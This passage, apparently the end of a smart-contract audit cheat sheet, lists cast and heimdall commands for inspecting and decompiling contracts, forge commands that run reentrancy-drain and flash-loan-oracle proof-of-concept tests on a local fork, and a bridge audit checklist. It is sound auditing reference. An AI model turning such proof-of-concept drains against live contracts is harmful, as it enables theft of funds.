cast call 0xTarget "totalAssets()" --rpc-url $RPC
cast storage 0xTarget 0 --rpc-url $RPC  # slot 0
cast 4byte 0x70a08231                   # decode selector

# ─── Decompile unverified contract ───
heimdall decompile --target 0xTarget --rpc-url $RPC

# ─── Decompile via web ───
# https://app.dedaub.com/decompile
# https://ethervm.io/decompile/mainnet/0xTarget

# ─── Reentrancy PoC skeleton ───
forge test --match-test test_PoC_DrainViaReentrancy \
  --fork-url http://localhost:8545 -vvvv 2>&1 | tee poc.log

# ─── Flash loan PoC skeleton ───
forge test --match-test test_PoC_FlashLoanOracle \
  --fork-url http://localhost:8545 -vvvv

# ─── Bridge audit quick checklist ───
# 1. signature hash includes BOTH chain IDs
# 2. signature replay protection (nonce + processed mapping)
# 3. validator set update has timelock
# 4. root hash initialization != zero (Nomad lesson)
# 5. pausable by multisig
```

---

**Related files**: `SKILL.md`, `test-cases.md`, `guides/smart-contract-audit-playbook.md`
**Slither upstream**: [github.com/crytic/slither](https://github.com/crytic/slither)
**Foundry book**: [book.getfoundry.sh](https://book.getfoundry.sh)
**SWC Registry**: [swcregistry.io](https://swcregistry.io)
